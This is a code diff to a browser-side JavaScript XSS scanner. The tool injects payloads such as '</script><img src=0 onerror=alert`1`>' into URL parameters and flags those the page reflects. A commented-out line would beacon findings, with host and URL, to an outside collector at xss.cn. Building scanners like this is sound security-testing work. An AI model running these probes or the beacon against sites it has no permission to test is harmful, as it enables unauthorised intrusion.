@@ -15,8 +15,8 @@ window.addEventListener('load', function(e) {setTimeout(function(){
 		return ;
 	}
 // (function(){
-	var onlyString = 'x"><img>' ;
-	var payloads = ['</script><img src=0 onerror=alert`1`>','x"><1rivir>']
+	var onlyString = 'x"><rivir>' ;
+	var payloads = ['x\'"><rivir>','</script><img src=0 onerror=alert`1`>',]
 	var protocol = window.location.protocol;
 	var host = window.location.host;
 	var href = window.location.href;
@@ -45,6 +45,7 @@ window.addEventListener('load', function(e) {setTimeout(function(){
 	}
 	function parameter_Xss(){ //URL参数检测XSS
 		var i;
+		var flag = 0;
 		var parameter = location.search.substring(1).split("&");
 		var url = protocol + "//" + host + "/" + urlPath.join("/") + "?";
 		for(i = 0;i < parameter.length;i++){
@@ -58,13 +59,17 @@ window.addEventListener('load', function(e) {setTimeout(function(){
 					async:false,
 				})
 				.done(function(data) {
-					if(data.indexOf(parameter[i].split("=")[1]) != "-1"){ //检测该参数的值是否再页面中。
-						alert("当前URL参数" +  parameter[i] + "存在XSS漏洞");
-						return 1; //检测出了注入就退出，不继续fuzz了。
+					if(data.indexOf(payloads[j]) != "-1"){ //检测payload的值是否再页面中。
+						alert("当前URL参数" +  parameter[i].split("=")[0]+'='+payloads[j]+ "存在XSS漏洞"); 
+						flag = 1; //设置flag,如果该参数存在xss,就不继续fuzz其他payload了。
 						// $("body").append("<img src='http://xss.cn/getXSS.html?host=$" + host + "&$xss=$" + parameter[i].split("=")[0] + "&$url=$" + window.location.href + "&$rand=$" + Date.parse(new Date()) + "' style='display:none;'>");
 					}
 				})
 				parameter[i] = parameterData; //恢复原来的参数
+				if(flag){
+					break;
+				}
+				
 			}
 		}
 	}
@@ -149,6 +154,7 @@ window.addEventListener('load', function(e) {setTimeout(function(){
 			}
 		})
 		if(tureForm.length <= 0){
+			alert('当前页面没有form');
 			return false;
 		}
 		tureForm = $(tureForm).filter(function(item,index){
